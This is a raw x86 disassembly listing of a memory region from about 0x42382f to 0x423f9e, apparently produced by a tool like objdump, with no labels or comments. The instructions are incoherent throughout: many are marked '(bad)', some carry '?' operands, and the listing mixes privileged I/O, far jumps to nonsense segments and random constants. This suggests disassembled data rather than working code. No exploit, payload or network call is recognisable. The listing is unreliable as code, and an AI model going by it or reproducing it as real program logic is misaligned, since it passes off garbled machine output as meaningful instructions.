  42382f:	mov    edx,DWORD PTR [esi-0x58]
  423832:	je     0x423885
  423834:	pop    edx
  423835:	in     eax,dx
  423836:	xor    esi,DWORD PTR [ebx]
  423838:	push   ecx
  423839:	fcom   QWORD PTR [ebp-0x13]
  42383c:	mov    ds:0xbc6b912b,al
  423841:	mov    DWORD PTR [edx+esi*8-0x6ade6ad],ebp
  423848:	dec    edi
  423849:	not    dh
  42384b:	mov    ebx,0x40a5d489
  423850:	dec    ebx
  423851:	std    
  423852:	and    al,0x3a
  423854:	hlt    
  423855:	add    eax,0xcfb0f622
  42385a:	(bad)
  42385d:	das    
  42385e:	repz iret 
  423860:	test   BYTE PTR [ebx+esi*8],ah
  423863:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423864:	(bad)
  423867:	dec    edx
  423868:	lds    ecx,FWORD PTR [ebp+0x57ff0e5e]
  42386e:	xchg   ecx,eax
  42386f:	push   edi
  423870:	cmp    eax,0x6e57e285
  423875:	cmp    DWORD PTR [eax-0x18],ebx
  423878:	iret   
  423879:	gs dec ecx
  42387b:	cdq    
  42387c:	into   
  42387d:	daa    
  42387e:	adc    eax,0x1d21b16b
  423883:	push   edx
  423884:	or     eax,0xaf9f07c9
  423889:	mov    ebx,0x2d64304a
  42388e:	mov    edi,0x57d28ab8
  423893:	adc    dl,BYTE PTR [ebp+0x37bfa475]
  423899:	fwait
  42389a:	push   ds
  42389b:	adc    eax,0x7563cbd7
  4238a0:	inc    esp
  4238a1:	xchg   ebp,eax
  4238a2:	push   esi
  4238a3:	xchg   cl,al
  4238a5:	rcl    DWORD PTR [edx],0xb
  4238a8:	inc    edi
  4238a9:	outs   dx,DWORD PTR ds:[esi]
  4238aa:	fucomip st,st(4)
  4238ac:	lea    esi,[edx+0x20c02af2]
  4238b2:	mov    edx,0x1eb4297a
  4238b7:	adc    ah,dl
  4238b9:	gs (bad) 
  4238bb:	scas   al,BYTE PTR es:[edi]
  4238bc:	adc    BYTE PTR [edi],0x54
  4238bf:	xchg   ebx,eax
  4238c0:	pop    eax
  4238c1:	pop    ebp
  4238c2:	dec    eax
  4238c3:	xor    edx,esp
  4238c5:	aas    
  4238c6:	gs loope 0x42389a
  4238c9:	xlat   BYTE PTR ds:[ebx]
  4238ca:	inc    esi
  4238cb:	mov    bl,0x68
  4238cd:	mov    al,0x6d
  4238cf:	fs lahf 
  4238d1:	mov    esp,0x93b4e48a
  4238d6:	lods   al,BYTE PTR ds:[esi]
  4238d7:	rol    cl,0x4
  4238da:	jmp    0xe5028284
  4238df:	cmc    
  4238e0:	in     eax,dx
  4238e1:	and    eax,0x2616d915
  4238e6:	or     ah,bh
  4238e8:	jbe    0x42386f
  4238ea:	and    BYTE PTR [ebx-0xa],cl
  4238ed:	and    eax,0x7d1ff6ca
  4238f2:	add    al,dl
  4238f4:	fldenv [ebp+0x35]
  4238f7:	adc    eax,0x814203d4
  4238fc:	xor    edx,0xf365fbb7
  423902:	popa   
  423903:	xchg   ebp,eax
  423904:	(bad)  [eax+0x16]
  423907:	mov    ds:0xa3eba7eb,eax
  42390c:	pop    es
  42390d:	adc    bl,BYTE PTR [ebp+0xf]
  423910:	cwde   
  423911:	call   0xaff53d47
  423916:	cmp    al,0x7a
  423918:	or     al,0x20
  42391a:	rol    DWORD PTR [edi],cl
  42391c:	sub    BYTE PTR [ebp+0x7c],0xd0
  423920:	pop    ecx
  423921:	jl     0x4238e3
  423923:	sbb    esp,esi
  423925:	icebp  
  423926:	and    al,0x23
  423928:	push   eax
  423929:	pop    es
  42392a:	xchg   edx,eax
  42392b:	mov    eax,ds:0xb061a4c7
  423930:	xor    edi,ecx
  423932:	xchg   DWORD PTR [ebp+0x329f4c0],edi
  423938:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42393a:	jno    0x423995
  42393c:	cmp    ch,dl
  42393e:	push   esp
  42393f:	imul   esi,DWORD PTR [ecx],0x3a
  423942:	inc    esi
  423943:	add    BYTE PTR [ebx+0x14],dl
  423946:	lock pop ebp
  423948:	push   esp
  423949:	mov    dh,0x4c
  42394b:	rol    BYTE PTR [esi+0x2e],0x19
  42394f:	inc    ebx
  423950:	shl    ebp,cl
  423952:	mov    bl,0xbd
  423954:	les    ebx,FWORD PTR ds:0x56d94612
  42395a:	sub    ebp,edx
  42395c:	gs adc eax,0x958a04a1
  423962:	mov    edx,0x14f27c51
  423967:	sbb    edx,DWORD PTR [ecx-0x279f19e5]
  42396d:	lea    ecx,es:[edi+0xabbfbcb]
  423974:	or     al,0x35
  423976:	sbb    edx,edx
  423978:	sbb    esi,DWORD PTR [edx+ebp*8+0x29]
  42397c:	push   ecx
  42397d:	sbb    eax,0x16b3f4
  423982:	js     0x423967
  423984:	sbb    DWORD PTR [esi+ebx*8-0x61],eax
  423988:	test   BYTE PTR [esi-0x36],bl
  42398b:	repz fwait
  42398d:	push   ebx
  42398e:	mov    dl,0x80
  423990:	xor    DWORD PTR [esi-0x9],eax
  423993:	aam    0xc6
  423995:	pop    ss
  423996:	clc    
  423997:	(bad)  
  423998:	push   ebp
  423999:	xchg   esp,eax
  42399a:	mov    ebp,0xd8b23bab
  42399f:	dec    ebp
  4239a0:	adc    dl,al
  4239a2:	repnz pop edx
  4239a4:	mov    dl,0x91
  4239a6:	mov    edi,0x437b5b23
  4239ab:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4239ad:	push   esi
  4239ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239af:	(bad)  
  4239b0:	jg     0x42393f
  4239b2:	ss lea eax,cs:[ebp+0x71]
  4239b7:	or     ebp,ebx
  4239b9:	xchg   esp,eax
  4239ba:	arpl   di,di
  4239bc:	in     eax,0xf9
  4239be:	pop    ecx
  4239bf:	cmp    ah,BYTE PTR [esi]
  4239c1:	cdq    
  4239c2:	stos   BYTE PTR es:[edi],al
  4239c3:	sbb    al,0xbc
  4239c5:	cdq    
  4239c6:	cs jmp 0xd63b:0x740d6b53
  4239ce:	cmp    eax,0xbf52e72e
  4239d3:	dec    ebp
  4239d4:	mov    bh,0x53
  4239d6:	or     BYTE PTR [esi+0x5b],ah
  4239d9:	ds mov esp,0xb6aa3a3b
  4239df:	sub    ebx,ebx
  4239e1:	push   ss
  4239e2:	xchg   ecx,eax
  4239e3:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4239e5:	ins    DWORD PTR es:[edi],dx
  4239e6:	sbb    al,0x24
  4239e8:	imul   ebx,DWORD PTR [eax-0x3c8765f6],0xffffff90
  4239ef:	mov    esi,DWORD PTR [ecx-0x4d]
  4239f2:	lods   eax,DWORD PTR ds:[esi]
  4239f3:	or     al,0x46
  4239f6:	out    0xea,al
  4239f8:	clc    
  4239f9:	pop    esi
  4239fa:	int    0x56
  4239fc:	dec    ebx
  4239fd:	loop   0x423a24
  4239ff:	jl     0x423a59
  423a01:	mov    ebx,0xc0467a7f
  423a06:	mov    ebx,0x4ebbd40a
  423a0b:	shr    BYTE PTR [ebx-0x18],0x6d
  423a0f:	or     eax,0x1538300
  423a14:	jp     0x423a04
  423a16:	fistp  WORD PTR [ebx-0x10b0a1f9]
  423a1c:	mov    ch,dh
  423a1e:	mov    edi,0xca219325
  423a23:	call   0x4bf:0x1d03b208
  423a2a:	jnp    0x4239e4
  423a2c:	fcom   DWORD PTR [edi+ecx*1]
  423a2f:	loop   0x423a07
  423a31:	inc    edx
  423a32:	add    ebp,DWORD PTR [ecx]
  423a34:	ss retf 0xbb52
  423a38:	stos   DWORD PTR es:[edi],eax
  423a39:	push   edx
  423a3a:	pop    ds
  423a3b:	(bad)
  423a3f:	and    ebx,DWORD PTR [ebx]
  423a41:	inc    esp
  423a42:	clc    
  423a43:	mov    DWORD PTR [edx-0x2287bb93],ebx
  423a49:	jecxz  0x423a73
  423a4b:	fldcw  WORD PTR [ecx-0x25]
  423a4e:	push   esp
  423a4f:	jns    0x423a52
  423a51:	and    eax,0x91b65a56
  423a56:	fimul  DWORD PTR [ebp+0x2a]
  423a59:	jne    0x423a82
  423a5b:	sub    DWORD PTR [esi-0x7f],ecx
  423a5e:	push   ss
  423a5f:	das    
  423a60:	int    0xce
  423a62:	fild   WORD PTR [edx+ebx*2+0x7c]
  423a66:	test   BYTE PTR [edx+ebp*8],dl
  423a69:	fst    DWORD PTR [esp+eax*4-0x69]
  423a6d:	leave  
  423a6e:	cld    
  423a6f:	sub    ch,BYTE PTR [edi+0x6decdfdb]
  423a75:	iret   
  423a76:	sub    eax,0xfa68b3ca
  423a7b:	jno    0x423a2f
  423a7d:	in     al,dx
  423a7e:	cli    
  423a7f:	arpl   dx,dx
  423a81:	jg     0x423ae5
  423a83:	jecxz  0x423aac
  423a85:	xchg   edx,eax
  423a86:	es cld 
  423a88:	lods   eax,DWORD PTR ds:[esi]
  423a89:	ss out 0x59,al
  423a8c:	or     esi,DWORD PTR [esi-0x943e5c3]
  423a92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a93:	mov    fs,WORD PTR [ecx-0xc64590a]
  423a99:	or     BYTE PTR [ecx+0x15],al
  423a9c:	stos   DWORD PTR es:[edi],eax
  423a9d:	xchg   esi,eax
  423a9e:	pop    ebp
  423a9f:	sar    DWORD PTR [edx+0x2f],cl
  423aa2:	sub    eax,0x5b5ef4d2
  423aa7:	jge    0x423a6c
  423aa9:	jae    0x423a58
  423aab:	mov    dh,0x88
  423aad:	ins    DWORD PTR es:[edi],dx
  423aae:	lods   al,BYTE PTR ds:[esi]
  423aaf:	pop    edx
  423ab0:	dec    edi
  423ab1:	ins    DWORD PTR es:[edi],dx
  423ab2:	sbb    eax,0xfaf8abd
  423ab7:	lods   eax,DWORD PTR ds:[esi]
  423ab8:	sbb    al,0x3a
  423aba:	jl     0x423a96
  423abc:	mov    ebx,0xab046a49
  423ac1:	dec    esp
  423ac2:	inc    eax
  423ac3:	das    
  423ac4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ac5:	(bad)  
  423ac6:	shr    DWORD PTR [ebx+0x893ff72],cl
  423acc:	xchg   edx,eax
  423acd:	pop    edi
  423ace:	sbb    cl,BYTE PTR [edx+0x61]
  423ad1:	mov    es,eax
  423ad3:	xchg   esi,eax
  423ad4:	mov    eax,DWORD PTR [edi+0x658b3254]
  423ada:	aaa    
  423adb:	lea    ecx,[edx+0x2d]
  423ade:	iret   
  423adf:	imul   esp,DWORD PTR ds:[edx-0x74],0x4f93556e
  423ae7:	jle    0x423b4f
  423ae9:	lods   eax,DWORD PTR ds:[esi]
  423aea:	xor    DWORD PTR [ebx-0x17],0x6a
  423aee:	dec    ecx
  423aef:	popf   
  423af0:	mov    esi,0x81d3a385
  423af5:	jmp    0x423a7f
  423af7:	xor    DWORD PTR [edi+0x47a62bb],ebp
  423afd:	popa   
  423afe:	lock mov ebp,0xc6ccf9ed
  423b04:	shr    esi,1
  423b06:	(bad)  
  423b07:	(bad)  
  423b08:	pop    esi
  423b09:	out    dx,eax
  423b0a:	test   al,0xec
  423b0c:	ins    DWORD PTR es:[edi],dx
  423b0d:	(bad)  
  423b0e:	mov    ch,0x66
  423b10:	mov    DWORD PTR [esi],esp
  423b12:	cli    
  423b13:	add    BYTE PTR [eax+0xe],dh
  423b16:	sub    edi,DWORD PTR [esi+eax*2-0x2e]
  423b1a:	xchg   DWORD PTR [ebp-0x224d3a5c],edi
  423b20:	sti    
  423b21:	push   ds
  423b22:	sar    BYTE PTR [edi+0x49],cl
  423b25:	mov    ecx,0xdaf6ea3f
  423b2a:	out    0x13,eax
  423b2c:	ret    
  423b2d:	pop    ecx
  423b2e:	int3   
  423b2f:	push   ecx
  423b30:	cdq    
  423b31:	mov    edx,0x93ca96ad
  423b36:	xlat   BYTE PTR ds:[ebx]
  423b37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b38:	popa   
  423b39:	dec    eax
  423b3a:	adc    bl,ah
  423b3c:	push   cs
  423b3d:	xchg   ecx,eax
  423b3e:	xor    DWORD PTR [edx+eiz*1+0x11],esp
  423b42:	mov    esi,es
  423b44:	and    ch,BYTE PTR [edx]
  423b46:	loopne 0x423b9e
  423b48:	push   ss
  423b49:	stc    
  423b4a:	mov    ah,0xad
  423b4c:	xchg   dl,cl
  423b4e:	stc    
  423b4f:	pusha  
  423b50:	xchg   DWORD PTR [edx-0x38],esi
  423b53:	dec    ecx
  423b54:	sbb    dh,BYTE PTR [ecx]
  423b56:	stos   DWORD PTR es:[edi],eax
  423b57:	test   BYTE PTR [ebp+0x65],bh
  423b5a:	sbb    ecx,edi
  423b5c:	mov    ds:0x44abf995,eax
  423b61:	adc    DWORD PTR [ebp+0x56],ebp
  423b64:	sahf   
  423b65:	xchg   edi,eax
  423b66:	pusha  
  423b67:	xchg   ecx,eax
  423b68:	lea    esi,[ecx-0x7ad6122d]
  423b6e:	mov    dh,0x8a
  423b70:	jp     0x423bd9
  423b72:	pop    esi
  423b73:	in     eax,dx
  423b74:	ror    BYTE PTR ds:0x9069914e,cl
  423b7a:	mov    ?,WORD PTR [edx-0x16]
  423b7d:	mov    al,ds:0x2b9fb697
  423b82:	xor    cl,bh
  423b84:	or     esp,DWORD PTR [edx+0x23]
  423b87:	jle    0x423b75
  423b89:	retf   
  423b8a:	(bad)
  423b8d:	or     BYTE PTR [ebx+0x6a6b968f],0x8e
  423b94:	inc    ebx
  423b96:	rol    BYTE PTR [edi+0x14],cl
  423b99:	retf   0xd765
  423b9c:	les    eax,FWORD PTR [edi+0x35bc75f2]
  423ba2:	adc    DWORD PTR [ebx+0x1d],esp
  423ba5:	jmp    0x9bdd:0xfb9500f8
  423bac:	inc    esi
  423bad:	pop    eax
  423bae:	sahf   
  423baf:	scas   al,BYTE PTR es:[edi]
  423bb0:	dec    edx
  423bb1:	jne    0x423b92
  423bb3:	xchg   ebp,eax
  423bb4:	dec    ebp
  423bb5:	ins    BYTE PTR es:[edi],dx
  423bb6:	sub    bl,dl
  423bb8:	ret    
  423bb9:	or     edi,DWORD PTR fs:[edi-0x6d]
  423bbd:	scas   eax,DWORD PTR es:[edi]
  423bbe:	nop
  423bbf:	mov    ch,0xf6
  423bc1:	and    BYTE PTR [ebp-0x4b68d02f],dh
  423bc7:	in     eax,0xe9
  423bc9:	hlt    
  423bca:	stos   DWORD PTR es:[edi],eax
  423bcb:	xchg   edi,eax
  423bcc:	or     eax,DWORD PTR [esi]
  423bce:	cs jbe 0x423b64
  423bd1:	call   0xc8702566
  423bd6:	fiadd  WORD PTR [ebx]
  423bd8:	je     0x423b77
  423bda:	adc    edx,esp
  423bdc:	sbb    ebp,0x1f6d4935
  423be2:	rol    BYTE PTR ds:0x70fe26e1,0x9c
  423be9:	loopne 0x423c1a
  423beb:	add    DWORD PTR [esi+0x47],0x6857d86a
  423bf2:	jecxz  0x423c0a
  423bf4:	mov    ebx,0x2f587cb7
  423bf9:	add    dl,bl
  423bfb:	mov    al,ds:0x83b1c357
  423c00:	sar    BYTE PTR [esi+eax*8-0x7d0af735],0xd8
  423c08:	mov    ?,WORD PTR [edx]
  423c0a:	mov    ah,0xc5
  423c0c:	shr    BYTE PTR [ebx-0x43],cl
  423c0f:	jne    0x423bb8
  423c11:	dec    esi
  423c12:	mov    eax,ds:0xb1f1e017
  423c17:	js     0x423c1b
  423c19:	adc    DWORD PTR [edx],esp
  423c1b:	xchg   esp,eax
  423c1c:	lods   al,BYTE PTR ds:[esi]
  423c1d:	repz xchg esi,eax
  423c1f:	or     eax,0x9ad48633
  423c24:	jp     0x423c79
  423c26:	in     eax,dx
  423c27:	mov    bl,0x36
  423c29:	inc    ebx
  423c2a:	mov    eax,ds:0x428de494
  423c2f:	jmp    DWORD PTR ds:0xb64262e1
  423c35:	jp     0x423c9d
  423c37:	add    ebp,DWORD PTR [edx+ebx*8]
  423c3a:	mov    ?,WORD PTR [edx+0x55da47fa]
  423c40:	mov    esp,0xc1271d9b
  423c45:	sub    al,0xff
  423c47:	inc    esp
  423c48:	gs lahf 
  423c4a:	mov    al,ds:0xaff28fb0
  423c4f:	inc    esp
  423c50:	mov    bh,0xc9
  423c52:	(bad)  
  423c53:	adc    DWORD PTR [edx-0x6a283aaf],edx
  423c59:	ror    BYTE PTR [edx+0x59ca20de],0x4
  423c60:	adc    bh,0xf1
  423c63:	mov    ecx,ss
  423c65:	dec    ebp
  423c66:	fadd   st,st(7)
  423c68:	push   ss
  423c69:	xchg   ebx,eax
  423c6a:	jns    0x423ceb
  423c6c:	sub    DWORD PTR [edi-0x5c474d7],edx
  423c72:	stc    
  423c73:	hlt    
  423c74:	jb     0x423cf4
  423c76:	add    al,BYTE PTR [esp+eiz*8+0x46ca0811]
  423c7d:	xchg   esp,eax
  423c7e:	sar    BYTE PTR [esi],0xd2
  423c81:	stos   DWORD PTR es:[edi],eax
  423c82:	cmp    DWORD PTR [esi],edi
  423c84:	dec    edi
  423c85:	sub    eax,DWORD PTR [ebx-0x62fa4c89]
  423c8b:	and    DWORD PTR [edi-0x2d],edx
  423c8e:	and    ebx,ebp
  423c90:	sbb    BYTE PTR [edx-0x7c],bh
  423c93:	fdivr  st(5),st
  423c95:	jl     0x423c3e
  423c97:	pop    es
  423c98:	ret    
  423c99:	mov    esp,0x47966203
  423c9e:	cmp    DWORD PTR [eax+edi*4+0x37],edi
  423ca2:	mov    dl,0x6a
  423ca4:	(bad)
  423ca7:	scas   al,BYTE PTR es:[edi]
  423ca8:	icebp  
  423ca9:	jns    0x423d09
  423cab:	jmp    0x423c5e
  423cad:	cmp    DWORD PTR [eax],0xbc03c756
  423cb3:	jnp    0x423cdd
  423cb5:	call   0xac95c756
  423cba:	xlat   BYTE PTR ds:[ebx]
  423cbb:	addr16 xchg ebx,eax
  423cbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423cbe:	mov    ebx,0x7e2f40e1
  423cc3:	sub    BYTE PTR [eax+eax*2+0x62],0x20
  423cc8:	and    al,0xd6
  423cca:	pusha  
  423ccb:	and    ch,BYTE PTR [eax+eiz*1-0x3c]
  423ccf:	idiv   bh
  423cd1:	sbb    ebx,DWORD PTR [edi+0x1d]
  423cd4:	aaa    
  423cd5:	dec    ebp
  423cd6:	pop    ebx
  423cd7:	mov    al,BYTE PTR [esi]
  423cd9:	retf   0xdf39
  423cdc:	pop    ss
  423cdd:	xor    dl,0xff
  423ce0:	iret   
  423ce1:	(bad)  
  423ce2:	jnp    0x423c64
  423ce4:	pop    ebp
  423ce5:	jbe    0x423c7d
  423ce7:	in     eax,0xc2
  423ce9:	neg    edx
  423ceb:	gs in  eax,dx
  423ced:	pop    esi
  423cee:	mov    edi,0x264fa75e
  423cf3:	gs es leave 
  423cf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423cf7:	inc    edi
  423cf8:	dec    edx
  423cf9:	and    BYTE PTR [ecx+eax*4],0xf8
  423cfd:	push   ebx
  423cfe:	inc    esp
  423cff:	mov    cs,WORD PTR [edx+0x54105070]
  423d05:	cmp    al,0x72
  423d07:	aam    0x73
  423d09:	hlt    
  423d0a:	test   al,0x97
  423d0c:	out    0xe8,eax
  423d0e:	cmp    DWORD PTR [edx-0x793baf28],esp
  423d14:	lea    esp,[edx]
  423d16:	sub    BYTE PTR [edx-0x7c],cl
  423d19:	add    BYTE PTR [ecx],al
  423d1b:	or     eax,0x20424a18
  423d20:	test   ah,dl
  423d22:	sub    DWORD PTR [ecx],ebp
  423d24:	xchg   ebx,eax
  423d25:	jmp    0xbbb19c5d
  423d2a:	div    DWORD PTR [ebp-0x2002129]
  423d30:	mov    esi,0x7adf3d7b
  423d35:	mov    edi,0x7b5d730d
  423d3a:	idiv   dh
  423d3c:	jbe    0x423d97
  423d3e:	jmp    0x423dad
  423d40:	iret   
  423d41:	repz fmul QWORD PTR [edi-0x9]
  423d45:	push   ds
  423d46:	and    BYTE PTR [esi+0x64],0x7f
  423d4a:	dec    ebp
  423d4b:	dec    ebx
  423d4c:	lock mov al,0x3e
  423d4f:	pop    ds
  423d50:	shl    bh,0xaa
  423d53:	aaa    
  423d54:	xor    bh,BYTE PTR [edi+0xc]
  423d57:	jge    0x423da8
  423d59:	push   esp
  423d5a:	and    edx,DWORD PTR [ecx+0x48daa29c]
  423d60:	pop    edx
  423d61:	mov    al,0x78
  423d63:	add    DWORD PTR [ebp+edi*2+0x40],esi
  423d67:	(bad)  
  423d68:	push   ecx
  423d69:	scas   eax,DWORD PTR es:[edi]
  423d6a:	pop    ecx
  423d6b:	mov    BYTE PTR [edx],dl
  423d6d:	test   eax,0xaae3c37d
  423d72:	xchg   DWORD PTR [eax],edi
  423d74:	mov    BYTE PTR [edi],cl
  423d76:	dec    esi
  423d77:	gs mov cl,0x10
  423d7a:	out    0x61,eax
  423d7c:	scas   eax,DWORD PTR es:[edi]
  423d7d:	pop    ss
  423d7e:	jne    0x423d10
  423d80:	iret   
  423d81:	out    dx,al
  423d82:	sub    BYTE PTR [edx],0xc2
  423d85:	fld    DWORD PTR [esi+0x27]
  423d88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d89:	dec    edx
  423d8a:	lods   eax,DWORD PTR ds:[esi]
  423d8b:	pop    ecx
  423d8c:	mov    edx,0x633abfee
  423d91:	jecxz  0x423dd7
  423d93:	cdq    
  423d94:	dec    edx
  423d95:	push   esi
  423d96:	xchg   esi,eax
  423d97:	cmp    ebp,DWORD PTR ds:0xa862a64c
  423d9d:	pop    ebx
  423d9e:	pop    ecx
  423d9f:	cmp    BYTE PTR [ebp+0xd40550d],al
  423da5:	mov    eax,ds:0x990e1c70
  423daa:	(bad)  
  423dab:	pop    ss
  423dac:	stos   DWORD PTR es:[edi],eax
  423dad:	adc    eax,0x54042854
  423db2:	pop    es
  423db3:	test   al,0x78
  423db5:	mov    ah,0x8f
  423db7:	pop    es
  423db8:	dec    edx
  423db9:	add    DWORD PTR [edx],0xffffffa9
  423dbc:	bound  esp,QWORD PTR [eax]
  423dbe:	sub    eax,ebx
  423dc0:	ja     0x423d55
  423dc2:	mov    DWORD PTR [ebp-0x39],ecx
  423dc5:	int3   
  423dc6:	jo     0x423d7d
  423dc8:	loopne 0x423d75
  423dca:	xor    DWORD PTR [ecx-0x8],esi
  423dcd:	mov    BYTE PTR [edi+0x54],dl
  423dd0:	and    DWORD PTR [ebx+0x6dc4e89c],0x39372439
  423dda:	mov    esi,0x135524b9
  423ddf:	pop    es
  423de0:	push   edi
  423de1:	pop    edi
  423de2:	lods   al,BYTE PTR ds:[esi]
  423de3:	loopne 0x423e48
  423de5:	arpl   WORD PTR [ecx],bx
  423de7:	cmp    al,0x56
  423de9:	call   0xc461fb4e
  423dee:	xchg   DWORD PTR [esi],esi
  423df0:	push   0xfffffff8
  423df2:	jne    0x423d89
  423df4:	imul   ecx,DWORD PTR [edx-0x3f],0x5bf52af6
  423dfb:	push   ebp
  423dfc:	jecxz  0x423d8f
  423dfe:	sub    al,cl
  423e00:	xchg   ebx,eax
  423e01:	xchg   esp,eax
  423e02:	test   BYTE PTR [edx-0x3d7c83ab],ch
  423e08:	in     eax,dx
  423e09:	push   cs
  423e0a:	into   
  423e0b:	sti    
  423e0c:	inc    edi
  423e0d:	ss mov dh,0xf4
  423e10:	std    
  423e11:	push   edi
  423e12:	(bad)  
  423e13:	cmc    
  423e14:	mov    esi,0xd0040fe
  423e19:	jmp    0xf7f8:0xa3340fca
  423e20:	push   eax
  423e21:	pop    edx
  423e22:	pop    ss
  423e23:	mov    ecx,ecx
  423e25:	xchg   ecx,eax
  423e26:	es push esi
  423e28:	mov    eax,0x5ea8bb06
  423e2d:	aam    0xdd
  423e2f:	xor    BYTE PTR [ecx-0x4f26784c],cl
  423e35:	test   DWORD PTR [ebx+0x61bc3542],ebx
  423e3b:	ja     0x423e3d
  423e3d:	adc    esi,DWORD PTR [esi+0x17]
  423e40:	mov    ebp,0xb0786aa7
  423e45:	loop   0x423eb1
  423e47:	push   es
  423e48:	jo     0x423e1b
  423e4a:	fstp   TBYTE PTR [ebx-0x6d]
  423e4d:	add    esp,edx
  423e4f:	loope  0x423ecc
  423e51:	ds dec esp
  423e53:	iret   
  423e54:	(bad)  
  423e55:	in     al,dx
  423e56:	jno    0x423e27
  423e58:	add    BYTE PTR fs:[esi+0x2a9b276e],ah
  423e5f:	or     al,0x60
  423e61:	sbb    bh,BYTE PTR [esi-0x74]
  423e64:	not    ecx
  423e66:	push   eax
  423e67:	add    BYTE PTR [edi-0x7c9d3565],bh
  423e6d:	inc    esp
  423e6e:	xchg   esi,eax
  423e6f:	mov    gs,WORD PTR [eax]
  423e71:	imul   edx,DWORD PTR [edi+eax*1-0xf],0x50
  423e76:	js     0x423ee8
  423e78:	xor    BYTE PTR [esi+edx*8+0x4778ca59],bh
  423e7f:	aad    0xf
  423e81:	xor    esi,DWORD PTR [ecx+0x55]
  423e84:	lods   al,BYTE PTR ds:[esi]
  423e85:	and    DWORD PTR [ebx+ecx*2-0x5c6cd0d5],esp
  423e8c:	dec    ebp
  423e8d:	inc    ebp
  423e8e:	ins    BYTE PTR es:[edi],dx
  423e8f:	pop    esp
  423e90:	fisubr WORD PTR [edx+eiz*8]
  423e93:	jecxz  0x423eb1
  423e95:	lds    ebx,FWORD PTR [edi]
  423e97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e98:	arpl   WORD PTR [esp+ebp*4+0x3e20dd01],ax
  423e9f:	adc    DWORD PTR [edx+0x2f5d6b1],esi
  423ea5:	jl     0x423ecf
  423ea7:	and    eax,0x55390f54
  423eac:	sti    
  423ead:	dec    ebp
  423eae:	push   ebp
  423eaf:	mov    ecx,cs
  423eb1:	jo     0x423f17
  423eb3:	arpl   WORD PTR [ecx],ax
  423eb5:	pop    es
  423eb6:	out    dx,eax
  423eb7:	jmp    0x423f0c
  423eb9:	aad    0xe0
  423ebb:	and    bl,BYTE PTR [edi+ebp*4]
  423ebe:	jp     0x423e6e
  423ec0:	inc    ebx
  423ec1:	ds arpl WORD PTR ss:[ecx+0x1e],si
  423ec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ec7:	push   ds
  423ec8:	dec    esi
  423ec9:	lock mov esi,0x6ac8ea49
  423ecf:	lods   al,BYTE PTR ds:[esi]
  423ed0:	stos   BYTE PTR es:[edi],al
  423ed1:	std    
  423ed2:	out    0x39,eax
  423ed4:	clc    
  423ed5:	or     eax,0x223dc518
  423eda:	mov    al,0x48
  423edc:	lods   al,BYTE PTR ds:[esi]
  423edd:	loop   0x423e85
  423edf:	push   esp
  423ee0:	sbb    eax,DWORD PTR [esi+0x23fd02b9]
  423ee6:	lock loope 0x423f68
  423ee9:	rcr    BYTE PTR [eax+0x44],1
  423eec:	fnstcw WORD PTR [eax]
  423eee:	sbb    edi,DWORD PTR [ebx]
  423ef0:	cmc    
  423ef1:	sub    dl,BYTE PTR [ebx+0x3d]
  423ef4:	or     BYTE PTR [ebx],bl
  423ef6:	inc    esp
  423ef7:	xor    al,BYTE PTR [bp+di]
  423efa:	push   ecx
  423efb:	add    eax,DWORD PTR [edx+0x67ecebf0]
  423f01:	loope  0x423ede
  423f03:	add    eax,DWORD PTR [ecx+eiz*8-0x5f583c56]
  423f0a:	in     al,dx
  423f0b:	cmp    ebp,DWORD PTR [ebx+ebx*1+0x7f]
  423f0f:	xchg   ebx,eax
  423f10:	mov    dl,0x75
  423f12:	pushf  
  423f13:	inc    ebp
  423f14:	inc    ecx
  423f15:	test   ebx,0x14d46beb
  423f1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423f1c:	xor    al,0xfc
  423f1e:	lahf   
  423f1f:	fisttp QWORD PTR [edx]
  423f21:	push   ds
  423f22:	pop    edx
  423f23:	jmp    0xd1d8:0x137cdfea
  423f2a:	js     0x423f9e
  423f2c:	cmp    BYTE PTR [eax-0x6f1439fc],ah
  423f32:	xor    DWORD PTR [edi],eax
  423f34:	and    DWORD PTR [ebx+edx*1-0xe],ebp
  423f38:	test   DWORD PTR [edi+0x23b4173e],0xbe37df44
  423f42:	imul   ebx,edx,0x0
  423f45:	add    al,0x3e
  423f47:	stos   DWORD PTR es:[edi],eax
  423f48:	mov    bl,0xa2
  423f4a:	aam    0x12
  423f4c:	mov    edi,DWORD PTR gs:[ecx+0x15]
  423f50:	daa    
  423f51:	push   ss
  423f52:	out    0x17,al
  423f54:	sub    al,0x9e
  423f56:	clc    
  423f57:	iret   
  423f58:	stos   BYTE PTR es:[edi],al
  423f59:	mov    ecx,0x8b5107f5
  423f5e:	popf   
  423f5f:	jge    0x423fd4
  423f61:	test   al,0x35
  423f63:	push   esp
  423f64:	nop
  423f65:	cwde   
  423f66:	stos   BYTE PTR es:[edi],al
  423f67:	mov    ch,0xef
  423f69:	pusha  
  423f6a:	xchg   edx,eax
  423f6b:	adc    dl,bh
  423f6d:	je     0x423fe5
  423f6f:	add    al,0x49
  423f71:	cmp    eax,DWORD PTR [esi+0x73a4a552]
  423f77:	stc    
  423f78:	mov    bh,0x88
  423f7a:	jl     0x423ff6
  423f7c:	stos   BYTE PTR es:[edi],al
  423f7d:	adc    DWORD PTR [eax+0x2e],0xffffff82
  423f81:	pusha  
  423f82:	scas   eax,DWORD PTR es:[edi]
  423f83:	lea    edx,[ebp+0x27]
  423f86:	stos   BYTE PTR es:[edi],al
  423f87:	imul   esi,DWORD PTR [eax],0xffffffec
  423f8a:	push   cs
  423f8b:	xor    al,0xb0
  423f8d:	push   esp
  423f8e:	ja     0x423fc1
  423f90:	mov    BYTE PTR [ecx-0x3230d33],0x9f
  423f97:	dec    esp
  423f98:	or     eax,0xe7025753
  423f9d:	lahf   
  423f9e:	in     al,dx
